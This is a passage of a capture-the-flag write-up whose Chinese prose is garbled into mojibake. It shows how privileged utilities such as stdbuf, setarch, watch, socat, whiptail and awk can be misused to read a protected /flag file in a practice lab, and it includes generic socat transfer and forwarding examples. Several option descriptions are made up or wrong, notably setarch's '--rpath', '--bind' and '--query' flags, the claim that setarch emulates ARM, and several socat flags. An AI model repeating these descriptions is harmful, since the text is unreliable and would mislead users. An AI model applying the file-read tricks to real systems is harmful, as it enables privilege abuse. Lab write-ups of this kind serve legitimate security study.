<p>‰æãÂ¶ÇÔºå<code>-i0</code> Ë°®Á§∫Á¶ÅÁî®Ê†áÂáÜËæìÂÖ•ÁöÑÁºìÂÜ≤Ôºå<code>-iL</code> Ë°®Á§∫‰ΩøÁî®Ë°åÁºìÂÜ≤Ê®°Âºè„ÄÇ</p>
</li>
<li>
<p><code>-o MODE</code> Êàñ <code>--output=MODE</code>ÔºöÊåáÂÆöÊ†áÂáÜËæìÂá∫ÁöÑÁºìÂÜ≤Ê®°Âºè„ÄÇ‰∏é <code>-i</code> Á±ª‰ººÔºåÂèØ‰ª•‰ΩøÁî® <code>MODE</code> ÂèÇÊï∞Êù•ÊåáÂÆöÊ†áÂáÜËæìÂá∫ÁöÑÁºìÂÜ≤Ê®°ÂºèÔºåÂèØÈÄâÂÄºÂêåÊ†∑ÂåÖÊã¨ <code>0</code>„ÄÅ<code>L</code> Âíå <code>N</code>„ÄÇ</p>
</li>
<li>
<p><code>-e MODE</code> Êàñ <code>--error=MODE</code>ÔºöÊåáÂÆöÊ†áÂáÜÈîôËØØËæìÂá∫ÁöÑÁºìÂÜ≤Ê®°Âºè„ÄÇ‰∏é <code>-i</code> Âíå <code>-o</code> Á±ª‰ººÔºåÂèØ‰ª•‰ΩøÁî® <code>MODE</code> ÂèÇÊï∞Êù•ÊåáÂÆöÊ†áÂáÜÈîôËØØËæìÂá∫ÁöÑÁºìÂÜ≤Ê®°ÂºèÔºåÂèØÈÄâÂÄºÂêåÊ†∑ÂåÖÊã¨ <code>0</code>„ÄÅ<code>L</code> Âíå <code>N</code>„ÄÇ</p>
</li>
<li>
<p><code>-i0 -o0 -e0</code>ÔºöÁ¶ÅÁî®Ê†áÂáÜËæìÂÖ•„ÄÅËæìÂá∫ÂíåÈîôËØØÁöÑÁºìÂÜ≤ÔºåËøôÁõ∏ÂΩì‰∫éÂú®‰ΩøÁî®ÁÆ°ÈÅìÁ≠âÊìç‰ΩúÊó∂ÂÆûÊó∂ËæìÂá∫ÔºåÈÄÇÁî®‰∫éÂÆûÊó∂Êó•ÂøóËæìÂá∫Á≠âÂú∫ÊôØ„ÄÇ</p>
</li>
</ol>
<p><code>stdbuf -i0 cat /flag</code></p>
<h3 id="level30setarch"><a class="markdownIt-Anchor" href="#level30setarch"></a> level30(setarch)</h3>
<p><code>setarch</code> ÂëΩ‰ª§Áî®‰∫éËÆæÁΩÆÊû∂ÊûÑÁâπÂÆöÁöÑÁ≥ªÁªüË∞ÉÁî®Ôºå‰ª•‰æøÂú®‰∏çÂêåÁöÑÁ≥ªÁªüÊû∂ÊûÑ‰πãÈó¥ËøõË°åËøêË°åÊó∂ÂàáÊç¢„ÄÇÂÆÉÈÄöÂ∏∏Áî®‰∫éÊ®°Êãü‰∏çÂêåÊû∂ÊûÑÁöÑÁéØÂ¢ÉÔºå‰æãÂ¶ÇÂú® x86 Á≥ªÁªü‰∏äÊ®°Êãü ARM Á≥ªÁªü„ÄÇ</p>
<p>‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>setarch</code> ÂëΩ‰ª§ÂèÇÊï∞Ôºö</p>
<ol>
<li><code>-h</code> Êàñ <code>--help</code>ÔºöÊòæÁ§∫Â∏ÆÂä©‰ø°ÊÅØÔºåÂàóÂá∫ <code>setarch</code> ÂëΩ‰ª§ÁöÑ‰ΩøÁî®ÊñπÊ≥ïÂíåÈÄâÈ°π„ÄÇ</li>
<li><code>-L</code> Êàñ <code>--list</code>ÔºöÂàóÂá∫Á≥ªÁªüÊîØÊåÅÁöÑÊâÄÊúâÊû∂ÊûÑ„ÄÇËøô‰∏™ÈÄâÈ°πÂèØ‰ª•Áî®Êù•Êü•ÁúãÁ≥ªÁªüÊîØÊåÅÁöÑÊâÄÊúâÊû∂ÊûÑÂàóË°®„ÄÇ</li>
<li><code>-R</code> Êàñ <code>--rpath</code>ÔºöËÆæÁΩÆËøêË°åÊó∂ÈìæÊé•Âô®Ë∑ØÂæÑ„ÄÇËøô‰∏™ÈÄâÈ°πÁî®‰∫éÊåáÂÆöÁ®ãÂ∫èËøêË°åÊó∂ÈìæÊé•Âô®ÁöÑË∑ØÂæÑ„ÄÇ</li>
<li><code>-B</code> Êàñ <code>--bind</code>ÔºöÁªëÂÆöÊåáÂÆöÁöÑÁ®ãÂ∫èÂà∞ÁâπÂÆöÁöÑÊû∂ÊûÑ„ÄÇ‰æãÂ¶ÇÔºå<code>setarch -B arm /bin/bash</code> Â∞Ü <code>/bin/bash</code> ÁªëÂÆöÂà∞ ARM Êû∂ÊûÑ„ÄÇ</li>
<li><code>-Q</code> Êàñ <code>--query</code>ÔºöÊü•ËØ¢ÊåáÂÆöÁ®ãÂ∫èÁöÑÊû∂ÊûÑ‰ø°ÊÅØ„ÄÇ‰æãÂ¶ÇÔºå<code>setarch -Q /bin/bash</code> Â∞ÜÊòæÁ§∫ <code>/bin/bash</code> ÁöÑÊû∂ÊûÑ‰ø°ÊÅØ„ÄÇ</li>
</ol>
<p><code>setarch $(arch) cat /flag</code></p>
<ul>
<li><code>$(arch)</code> ‰ºöËøîÂõûÂΩìÂâçÁ≥ªÁªüÁöÑÊû∂ÊûÑ‰ø°ÊÅØ„ÄÇ‰æãÂ¶ÇÔºåÂú® x86 Á≥ªÁªü‰∏äÔºå<code>$(arch)</code> ÂèØËÉΩ‰ºöËøîÂõû <code>x86_64</code>Ôºà64 ‰ΩçÔºâÊàñ <code>i386</code>Ôºà32 ‰ΩçÔºâÁ≠â„ÄÇ</li>
<li><code>setarch</code> ÂëΩ‰ª§Áî®‰∫éËÆæÁΩÆËøêË°åÊó∂ÁöÑÁ≥ªÁªüÊû∂ÊûÑ„ÄÇ</li>
<li><code>cat /flag</code> ÂëΩ‰ª§Áî®‰∫éÊâìÂç∞ <code>/flag</code> Êñá‰ª∂ÁöÑÂÜÖÂÆπÂà∞Ê†áÂáÜËæìÂá∫„ÄÇ</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level30:/challenge$ setarch <span class="token parameter variable">--li</span>
uname26
linux32
linux64
i386
i486
i586
i686
athlon
x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level31watch"><a class="markdownIt-Anchor" href="#level31watch"></a> level31(watch)</h3>
<p><code>watch</code> ÊòØ‰∏Ä‰∏™ÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÔºåÁî®‰∫éÂë®ÊúüÊÄßÂú∞ÊâßË°åÊåáÂÆöÁöÑÂëΩ‰ª§ÔºåÂπ∂Â∞ÜÂÖ∂ËæìÂá∫ÊòæÁ§∫Âú®ÁªàÁ´Ø‰∏ä„ÄÇÂÆÉÂèØ‰ª•Â∏ÆÂä©‰Ω†ÁõëËßÜÂëΩ‰ª§ÁöÑËæìÂá∫ÔºåÂπ∂ÂÆöÊúüÂà∑Êñ∞ÊòæÁ§∫ÁªìÊûúÔºå‰ªéËÄåÂÆûÊó∂Êü•ÁúãÂëΩ‰ª§ÁöÑÊâßË°åÊÉÖÂÜµ„ÄÇ</p>
<p><code>watch</code> ÂëΩ‰ª§ÁöÑÂü∫Êú¨ËØ≠Ê≥ïÂ¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">watch [options] command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ÂÖ∂‰∏≠Ôºå<code>command</code> ÊòØË¶ÅÊâßË°åÁöÑÂëΩ‰ª§ÔºåËÄå <code>[options]</code> ÊòØ‰∏Ä‰∫õÈÄâÈ°πÔºåÁî®‰∫éÊåáÂÆö <code>watch</code> ÂëΩ‰ª§ÁöÑË°å‰∏∫„ÄÇ</p>
<p>‰∏Ä‰∫õÂ∏∏ËßÅÁöÑ <code>watch</code> ÂëΩ‰ª§ÈÄâÈ°πÂåÖÊã¨Ôºö</p>
<ul>
<li><code>-n, --interval</code>ÔºöÊåáÂÆöÂà∑Êñ∞Èó¥ÈöîÊó∂Èó¥Ôºå‰ª•Áßí‰∏∫Âçï‰Ωç„ÄÇÈªòËÆ§Èó¥ÈöîÊó∂Èó¥ÊòØ 2 Áßí„ÄÇ</li>
<li><code>-d, --differences</code>Ôºö‰ªÖÊòæÁ§∫‰∏é‰∏äÊ¨°ËæìÂá∫‰∏çÂêåÁöÑÂÜÖÂÆπ„ÄÇËøô‰∏™ÈÄâÈ°πÂèØ‰ª•Â∏ÆÂä©‰Ω†Âø´ÈÄüÂú∞Êü•ÁúãËæìÂá∫ÁöÑÂèòÂåñ„ÄÇ</li>
<li><code>-t, --no-title</code>Ôºö‰∏çÊòæÁ§∫Ê†áÈ¢òË°å„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºå<code>watch</code> ‰ºöÂú®È°∂ÈÉ®ÊòæÁ§∫‰∏Ä‰∏™Ê†áÈ¢òË°åÔºåÊòæÁ§∫ÂΩìÂâçÊó∂Èó¥ÂíåÊ≠£Âú®ÊâßË°åÁöÑÂëΩ‰ª§„ÄÇ</li>
<li><code>-h, --help</code>ÔºöÊòæÁ§∫Â∏ÆÂä©‰ø°ÊÅØÔºåÂàóÂá∫ <code>watch</code> ÂëΩ‰ª§ÁöÑ‰ΩøÁî®ÊñπÊ≥ïÂíåÈÄâÈ°π„ÄÇ</li>
</ul>
<p>‰æãÂ¶ÇÔºåË¶ÅÁõëËßÜÁ≥ªÁªüÂΩìÂâçÁöÑÊó∂Èó¥ÂèòÂåñÔºåÂèØ‰ª•‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">watch date<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰∏™ÂëΩ‰ª§‰ºöÊØèÈöî 2 ÁßíÊâßË°å‰∏ÄÊ¨° <code>date</code> ÂëΩ‰ª§ÔºåÂπ∂Â∞ÜÂÖ∂ËæìÂá∫ÊòæÁ§∫Âú®ÁªàÁ´Ø‰∏äÔºåÂÆûÊó∂Êõ¥Êñ∞Á≥ªÁªüÂΩìÂâçÁöÑÊó∂Èó¥„ÄÇ</p>
<p><code>watch -x cat /flag</code></p>
<h3 id="level32socat"><a class="markdownIt-Anchor" href="#level32socat"></a> level32(socat)</h3>
<p><code>socat</code> ÁöÑÈÄâÈ°πÂíåÂèÇÊï∞ÈùûÂ∏∏Â§öÔºå‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑÈÄâÈ°πÂíåÂèÇÊï∞Ôºö</p>
<ul>
<li><code>-h</code>ÔºöÊòæÁ§∫Â∏ÆÂä©‰ø°ÊÅØÔºåÂàóÂá∫ <code>socat</code> ÂëΩ‰ª§ÁöÑ‰ΩøÁî®ÊñπÊ≥ïÂíåÈÄâÈ°π„ÄÇ</li>
<li><code>-V</code>ÔºöÊòæÁ§∫ÁâàÊú¨‰ø°ÊÅØÔºåÂåÖÊã¨ <code>socat</code> ÁöÑÁâàÊú¨Âè∑„ÄÇ</li>
<li><code>-d</code>ÔºöÂêØÁî®Ë∞ÉËØïÊ®°ÂºèÔºåÊòæÁ§∫Êõ¥ËØ¶ÁªÜÁöÑË∞ÉËØï‰ø°ÊÅØ„ÄÇ</li>
<li><code>-v</code>ÔºöÊòæÁ§∫ËØ¶ÁªÜ‰ø°ÊÅØÔºåÂåÖÊã¨Ê≠£Âú®ËøõË°åÁöÑËøûÊé•ÂíåÊï∞ÊçÆ‰º†ËæìÁöÑËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇ</li>
<li><code>-t &lt;time&gt;</code>ÔºöËÆæÁΩÆË∂ÖÊó∂Êó∂Èó¥ÔºåÊåáÂÆö <code>socat</code> Âú®ËøûÊé•Âª∫Á´ãÊàñÊï∞ÊçÆ‰º†ËæìÊó∂Á≠âÂæÖÁöÑÊúÄÂ§ßÊó∂Èó¥„ÄÇ</li>
<li><code>-T &lt;time&gt;</code>ÔºöËÆæÁΩÆÊï∞ÊçÆ‰º†ËæìË∂ÖÊó∂Êó∂Èó¥ÔºåÊåáÂÆö <code>socat</code> Âú®‰º†ËæìÊï∞ÊçÆÊó∂ÁöÑÊúÄÂ§ßÁ≠âÂæÖÊó∂Èó¥„ÄÇ</li>
<li><code>-u</code>ÔºöÁî®‰∫éÊåáÂÆö‰ΩøÁî®Êó†ÁºìÂÜ≤Ê®°ÂºèÔºàunbuffered modeÔºâ„ÄÇÂÖ∑‰ΩìÊù•ËØ¥ÔºåÂÆÉÂëäËØâ <code>socat</code> Âú®Êï∞ÊçÆ‰º†ËæìÊó∂‰∏çË¶Å‰ΩøÁî®ÁºìÂÜ≤ÔºåËÄåÊòØÁ´ãÂç≥‰º†ËæìÊï∞ÊçÆ„ÄÇ</li>
<li><code>-4</code>ÔºöÂº∫Âà∂ <code>socat</code> ‰ΩøÁî® IPv4 Âú∞ÂùÄ„ÄÇ</li>
<li><code>-6</code>ÔºöÂº∫Âà∂ <code>socat</code> ‰ΩøÁî® IPv6 Âú∞ÂùÄ„ÄÇ</li>
<li><code>-b &lt;size&gt;</code>ÔºöËÆæÁΩÆÊï∞ÊçÆÂùóÂ§ßÂ∞èÔºåÊåáÂÆö <code>socat</code> Âú®‰º†ËæìÊï∞ÊçÆÊó∂‰ΩøÁî®ÁöÑÁºìÂÜ≤Âå∫Â§ßÂ∞è„ÄÇ</li>
<li><code>-c</code>ÔºöÂÖ≥Èó≠ <code>socat</code> ÁöÑÊ†áÂáÜËæìÂÖ•Ôºå‰ΩøÂÖ∂Âú®ÂêØÂä®Âêé‰∏çÊé•ÂèóÈîÆÁõòËæìÂÖ•„ÄÇ</li>
<li><code>-e</code>Ôºö‰Ωø <code>socat</code> ‰ª•Èùû‰∫§‰∫íÊ®°ÂºèÂêØÂä®ÔºåÁî®‰∫éÂ∞ÜÂÖ∂ÂµåÂÖ•Âà∞ËÑöÊú¨‰∏≠„ÄÇ</li>
<li><code>-p</code>Ôºö‰øùÊåÅËøûÊé•Ôºå‰Ωø <code>socat</code> Âú®‰º†ËæìÂÆåÊàêÂêé‰øùÊåÅËøûÊé•Áä∂ÊÄÅ„ÄÇ</li>
<li><code>-x</code>ÔºöÊòæÁ§∫ÂçÅÂÖ≠ËøõÂà∂Ê†ºÂºèÁöÑÊï∞ÊçÆ„ÄÇ</li>
<li><code>-S</code>ÔºöÊâìÂºÄÊó•ÂøóËÆ∞ÂΩïÂäüËÉΩÔºåËÆ∞ÂΩï <code>socat</code> ÁöÑÊâßË°åÊó•Âøó„ÄÇ</li>
<li><code>-N</code>ÔºöÁ¶ÅÁî® DNS Êü•ËØ¢ÔºåÊåáÂÆö <code>socat</code> ‰∏çËøõË°å DNS Êü•ËØ¢„ÄÇ<br />
<code>socat -u FILE:/flag STDOUT</code></li>
</ul>
<p><code>socat</code> ÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÁÅµÊ¥ªÁöÑÂ∑•ÂÖ∑ÔºåÂèØ‰ª•Áî®‰∫éÂêÑÁßçÁΩëÁªúÈÄö‰ø°Âú∫ÊôØ„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∫õ <code>socat</code> ÁöÑÂ∏∏ËßÅÁî®Ê≥ïÔºö</p>
<ol>
<li>
<p><strong>TCP/UDP ËøûÊé•</strong>Ôºö<code>socat</code> ÂèØ‰ª•Áî®‰∫éÂú®‰∏§‰∏™‰∏ªÊú∫‰πãÈó¥Âª∫Á´ã TCP Êàñ UDP ËøûÊé•„ÄÇ‰æãÂ¶ÇÔºåÂ∞Ü <code>socat</code> ‰Ωú‰∏∫ÁÆÄÂçïÁöÑ TCP ÊúçÂä°Âô®ËøêË°åÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">socat TCP-LISTEN:1234,fork<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ËøôÂ∞ÜÂú®Êú¨Âú∞ÁöÑ 1234 Á´ØÂè£‰∏äÂêØÂä®‰∏Ä‰∏™ TCP ÊúçÂä°Âô®ÔºåÊé•ÂèóÊù•Ëá™ÂÆ¢Êà∑Á´ØÁöÑËøûÊé•ÔºåÂπ∂Â∞ÜËøûÊé•ÂàÜÈÖçÁªôÊñ∞ÁöÑÂ≠êËøõÁ®ãÊù•Â§ÑÁêÜ„ÄÇ</p>
</li>
<li>
<p><strong>Êñá‰ª∂‰º†Ëæì</strong>Ôºö<code>socat</code> ÂèØ‰ª•Áî®‰∫éÂ∞ÜÊñá‰ª∂‰ªé‰∏Ä‰∏™Âú∞Êñπ‰º†ËæìÂà∞Âè¶‰∏Ä‰∏™Âú∞ÊñπÔºåÂåÖÊã¨ÈÄöËøáÁΩëÁªú‰º†ËæìÊñá‰ª∂„ÄÇ‰æãÂ¶ÇÔºåÂ∞ÜÊñá‰ª∂‰ªéÊú¨Âú∞‰º†ËæìÂà∞ËøúÁ®ã‰∏ªÊú∫Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">socat FILE:&#x2F;path&#x2F;to&#x2F;local&#x2F;file TCP:remote_host:port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰ºöÂ∞ÜÊú¨Âú∞Êñá‰ª∂‰º†ËæìÂà∞ËøúÁ®ã‰∏ªÊú∫ÁöÑÊåáÂÆöÁ´ØÂè£‰∏ä„ÄÇ</p>
</li>
<li>
<p><strong>Âä†ÂØÜÈÄö‰ø°</strong>Ôºö<code>socat</code> ÂèØ‰ª•Âíå <code>openssl</code> ÁªìÂêà‰ΩøÁî®ÔºåÂÆûÁé∞Âä†ÂØÜÁöÑÁΩëÁªúÈÄö‰ø°„ÄÇ‰æãÂ¶ÇÔºå‰ΩøÁî® TLS ËøûÊé•Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">socat openssl-connect:remote_host:port,verify&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰ºöÂú®Êú¨Âú∞ÂíåËøúÁ®ã‰∏ªÊú∫‰πãÈó¥Âª∫Á´ã‰∏Ä‰∏™‰ΩøÁî® TLS Âä†ÂØÜÁöÑËøûÊé•„ÄÇ</p>
</li>
<li>
<p><strong>‰∏≤Âè£ÈÄö‰ø°</strong>Ôºö<code>socat</code> ÂèØ‰ª•Áî®‰∫éÂú®‰∏≤Âè£‰πãÈó¥‰º†ËæìÊï∞ÊçÆÔºå‰æãÂ¶Ç RS232„ÄÅRS485 Á≠â„ÄÇ‰æãÂ¶ÇÔºåÂ∞ÜÊï∞ÊçÆ‰ªé‰∏Ä‰∏™‰∏≤Âè£‰º†ËæìÂà∞Âè¶‰∏Ä‰∏™‰∏≤Âè£Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">socat &#x2F;dev&#x2F;ttyS0,raw,echo&#x3D;0 &#x2F;dev&#x2F;ttyS1,raw,echo&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰ºöÂ∞Ü <code>/dev/ttyS0</code> ÁöÑÊï∞ÊçÆ‰º†ËæìÂà∞ <code>/dev/ttyS1</code>„ÄÇ</p>
</li>
<li>
<p><strong>Á´ØÂè£ËΩ¨Âèë</strong>Ôºö<code>socat</code> ÂèØ‰ª•Áî®‰∫éÁ´ØÂè£ËΩ¨ÂèëÔºåÂ∞Ü‰∏Ä‰∏™Á´ØÂè£‰∏äÊî∂Âà∞ÁöÑÊï∞ÊçÆËΩ¨ÂèëÂà∞Âè¶‰∏Ä‰∏™Á´ØÂè£„ÄÇ‰æãÂ¶ÇÔºåÂ∞ÜÊú¨Âú∞ÁöÑ 8080 Á´ØÂè£‰∏äÊî∂Âà∞ÁöÑÊï∞ÊçÆËΩ¨ÂèëÂà∞ËøúÁ®ã‰∏ªÊú∫ÁöÑ 80 Á´ØÂè£‰∏äÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">socat TCP-LISTEN:8080,fork TCP:remote_host:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰ºöÂ∞ÜÊú¨Âú∞ 8080 Á´ØÂè£ÁöÑÊï∞ÊçÆËΩ¨ÂèëÂà∞ËøúÁ®ã‰∏ªÊú∫ÁöÑ 80 Á´ØÂè£‰∏ä„ÄÇ</p>
</li>
</ol>
<p><code>socat -u &quot;file:/flag&quot; STDOUT</code></p>
<h3 id="level33whiptail"><a class="markdownIt-Anchor" href="#level33whiptail"></a> level33(whiptail)</h3>
<p><code>whiptail</code> ÊòØ‰∏Ä‰∏™Âú®ÁªàÁ´Ø‰∏≠ÊòæÁ§∫ÂØπËØùÊ°ÜÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÔºåÂ∏∏Áî®‰∫éËÑöÊú¨‰∏≠ÂàõÂª∫Áî®Êà∑ÂèãÂ•ΩÁöÑ‰∫§‰∫íÁïåÈù¢„ÄÇÂÆÉÂèØ‰ª•Áî®‰∫éÊòæÁ§∫ÂêÑÁßçÁ±ªÂûãÁöÑÂØπËØùÊ°ÜÔºåÂåÖÊã¨Ê∂àÊÅØÊ°Ü„ÄÅËæìÂÖ•Ê°Ü„ÄÅÈÄâÊã©Ê°ÜÁ≠âÔºå‰ª•‰æø‰∏éÁî®Êà∑ËøõË°å‰∫§‰∫í„ÄÇ</p>
<p>‰ª•‰∏ãÊòØ <code>whiptail</code> ÁöÑÂü∫Êú¨Áî®Ê≥ïÔºö</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail [options] &lt;args&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ÂÖ∂‰∏≠ <code>[options]</code> ÊòØ‰∏Ä‰∫õÈÄâÈ°πÔºå<code>&lt;args&gt;</code> ÊòØÁî®‰∫éÊåáÂÆöÂØπËØùÊ°ÜÁ±ªÂûãÂíåÂÜÖÂÆπÁöÑÂèÇÊï∞„ÄÇ</p>
<p>‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>whiptail</code> ÂØπËØùÊ°ÜÁ±ªÂûãÂíåÁ§∫‰æãÁî®Ê≥ïÔºö</p>
<ol>
<li>
<p><strong>Ê∂àÊÅØÊ°Ü</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail --msgbox &quot;This is a message&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰ºöÂú®ÁªàÁ´Ø‰∏≠ÊòæÁ§∫‰∏Ä‰∏™Ê∂àÊÅØÊ°ÜÔºåÊòæÁ§∫ÊñáÊú¨ ‚ÄúThis is a message‚ÄùÔºåÊ°ÜÁöÑÂ§ßÂ∞è‰∏∫ 10 Ë°å 40 Âàó„ÄÇ</p>
</li>
<li>
<p><strong>ËæìÂÖ•Ê°Ü</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail --inputbox &quot;Enter your name:&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰ºöÂú®ÁªàÁ´Ø‰∏≠ÊòæÁ§∫‰∏Ä‰∏™ËæìÂÖ•Ê°ÜÔºåÊèêÁ§∫Áî®Êà∑ËæìÂÖ•ÂêçÁß∞„ÄÇ</p>
</li>
<li>
<p><strong>ÈÄâÊã©Ê°Ü</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail --menu &quot;Choose an option:&quot; 15 40 4 \
&quot;1&quot; &quot;Option 1&quot; \
&quot;2&quot; &quot;Option 2&quot; \
&quot;3&quot; &quot;Option 3&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>Ëøô‰ºöÂú®ÁªàÁ´Ø‰∏≠ÊòæÁ§∫‰∏Ä‰∏™ÈÄâÊã©Ê°ÜÔºå‰æõÁî®Êà∑‰ªéÂá†‰∏™ÈÄâÈ°π‰∏≠ÈÄâÊã©„ÄÇ</p>
</li>
<li>
<p><strong>Yes/No ÂØπËØùÊ°Ü</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail --yesno &quot;Do you want to continue?&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ëøô‰ºöÂú®ÁªàÁ´Ø‰∏≠ÊòæÁ§∫‰∏Ä‰∏™ Yes/No ÂØπËØùÊ°ÜÔºåËØ¢ÈóÆÁî®Êà∑ÊòØÂê¶Ë¶ÅÁªßÁª≠Êìç‰Ωú„ÄÇ</p>
</li>
</ol>
<p>ÈÄöËøáÊü•ÈòÖ<code>man</code>ÊñáÊ°£ÂèØ‰ª•ÊâæÂà∞‰∏Ä‰∏™ÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπÁöÑÂëΩ‰ª§</p>
<p><code>whiptail --textbox /flag 10 20</code></p>
<ul>
<li><code>whiptail</code> ÊòØÁî®‰∫éÂàõÂª∫ÂØπËØùÊ°ÜÁöÑÂëΩ‰ª§„ÄÇ</li>
<li><code>--textbox</code> Ë°®Á§∫ÂàõÂª∫‰∏Ä‰∏™ÊñáÊú¨Ê°ÜÂØπËØùÊ°ÜÔºåÁî®‰∫éÊòæÁ§∫Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ</li>
<li><code>/flag</code> ÊòØÊåáÂÆöÁöÑÊñá‰ª∂Ë∑ØÂæÑÔºåÂç≥Ë¶ÅÊòæÁ§∫ÂÜÖÂÆπÁöÑÊñá‰ª∂„ÄÇ</li>
<li><code>10</code> ÊòØÊåáÂÆöÂØπËØùÊ°ÜÁöÑÈ´òÂ∫¶ÔºåË°®Á§∫ÊñáÊú¨Ê°ÜÂú®ÂûÇÁõ¥ÊñπÂêë‰∏äÂèØ‰ª•ÊòæÁ§∫ÁöÑË°åÊï∞„ÄÇ</li>
<li><code>20</code> ÊòØÊåáÂÆöÂØπËØùÊ°ÜÁöÑÂÆΩÂ∫¶ÔºåË°®Á§∫ÊñáÊú¨Ê°ÜÂú®Ê∞¥Âπ≥ÊñπÂêë‰∏äÂèØ‰ª•ÊòæÁ§∫ÁöÑÂ≠óÁ¨¶Êï∞„ÄÇ</li>
</ul>
<h3 id="level34awk"><a class="markdownIt-Anchor" href="#level34awk"></a> level34(awk)</h3>
<p><code>awk</code> ÊòØ‰∏ÄÁßçÂº∫Â§ßÁöÑÊñáÊú¨Â§ÑÁêÜÂ∑•ÂÖ∑ÔºåÈÄöÂ∏∏Áî®‰∫éÂØπÁªìÊûÑÂåñÊñáÊú¨Êï∞ÊçÆËøõË°åÂ§ÑÁêÜ„ÄÅÂàÜÊûêÂíåËΩ¨Êç¢„ÄÇÂÆÉ‰ª•ÈÄêË°åÊñπÂºèÊâ´ÊèèËæìÂÖ•Êñá‰ª∂ÔºåÂπ∂Ê†πÊçÆÊåáÂÆöÁöÑÊ®°ÂºèÂíåÂä®‰ΩúÂØπÊï∞ÊçÆËøõË°åÂ§ÑÁêÜ„ÄÇ‰ª•‰∏ãÊòØ <code>awk</code> Â∏∏ËßÅÁî®Ê≥ïÂíåÂèÇÊï∞ÁöÑÊ¶ÇËø∞Ôºö</p>
<h4 id="Âü∫Êú¨ËØ≠Ê≥ï"><a class="markdownIt-Anchor" href="#Âü∫Êú¨ËØ≠Ê≥ï"></a> Âü∫Êú¨ËØ≠Ê≥ï</h4>
<pre class="line-numbers language-none"><code class="language-none">awk [options] &#39;pattern &#123;action&#125;&#39; file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li><code>options</code>Ôºö<code>awk</code> ÁöÑÈÄâÈ°πÔºåÁî®‰∫éÊåáÂÆö‰∏Ä‰∫õÊéßÂà∂Ë°å‰∏∫Ôºå‰æãÂ¶ÇÂ≠óÊÆµÂàÜÈöîÁ¨¶„ÄÅÂ§ÑÁêÜÊñá‰ª∂ÂºÄÂßãÂíåÁªìÊùüÁ≠â„ÄÇ</li>
<li><code>pattern</code>ÔºöÊ®°ÂºèÔºåÁî®‰∫éÂåπÈÖçËæìÂÖ•Êï∞ÊçÆÁöÑË°å„ÄÇ</li>
<li><code>&#123;action&#125;</code>ÔºöÂä®‰ΩúÔºåÁî®‰∫éÂØπÂåπÈÖçÁöÑË°åÊâßË°åÊìç‰Ωú„ÄÇ</li>
<li><code>file</code>ÔºöË¶ÅÂ§ÑÁêÜÁöÑÊñá‰ª∂Âêç„ÄÇ</li>
</ul>
<h4 id="Â∏∏ËßÅÈÄâÈ°π"><a class="markdownIt-Anchor" href="#Â∏∏ËßÅÈÄâÈ°π"></a> Â∏∏ËßÅÈÄâÈ°π</h4>
<ul>
<li><code>-F &lt;separator&gt;</code>ÔºöÊåáÂÆöÂ≠óÊÆµÂàÜÈöîÁ¨¶„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåÂ≠óÊÆµÂàÜÈöîÁ¨¶‰∏∫Á©∫Ê†ºÊàñÂà∂Ë°®Á¨¶„ÄÇ</li>
<li><code>-f &lt;file&gt;</code>Ôºö‰ªéÊåáÂÆöÁöÑÊñá‰ª∂‰∏≠ËØªÂèñ <code>awk</code> ËÑöÊú¨„ÄÇ</li>
<li><code>-v &lt;var=value&gt;</code>ÔºöËÆæÁΩÆ <code>awk</code> ÂèòÈáèÁöÑÂÄº„ÄÇ</li>
<li><code>-W &lt;compat|posix&gt;</code>ÔºöËÆæÁΩÆÂÖºÂÆπÊÄßÊ®°Âºè„ÄÇ</li>
<li><code>-F,</code>ÔºöÊåáÂÆöÈÄóÂè∑‰∏∫Â≠óÊÆµÂàÜÈöîÁ¨¶„ÄÇ</li>
